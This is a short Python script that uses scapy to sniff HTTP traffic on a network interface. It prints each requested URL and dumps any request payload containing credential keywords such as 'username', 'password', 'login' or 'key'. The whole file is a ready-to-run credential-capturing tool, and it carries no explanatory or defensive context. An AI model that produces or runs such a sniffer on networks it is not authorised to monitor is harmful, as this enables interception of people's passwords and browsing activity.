import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffed_packet_load)

def sniffed_packet_load(packet):

    if(packet.haslayer(http.HTTPRequest)):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        if (packet.haslayer(scapy.Raw)):
            load = packet[scapy.Raw].load;
            keywords = ['user', 'username', 'password', 'pass', 'login', 'name', 'key'];
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break


sniff('eth0')